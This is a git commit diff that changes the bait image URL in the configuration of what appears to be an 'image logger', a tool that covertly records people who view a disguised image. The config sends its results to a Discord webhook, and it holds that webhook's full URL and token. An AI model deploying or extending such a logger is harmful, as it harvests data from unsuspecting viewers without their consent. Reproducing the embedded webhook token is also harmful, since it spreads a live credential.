3e954fe498fd06e0ec2947122f7860ab90597123
Vetr1x123 <fabiohose35@gmail.com>
2025-09-08 15:56:11 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://canary.discord.com/api/webhooks/1414609279788388382/bYtwJYaX1Ma__csrqaGCPXlUPl5MlCWSpE6_JXb90ej0i07jw7fbRZLEkzHbRMYE6g96",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://api.realdudesinc.com/uploads/rdi24_84c5a90691.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
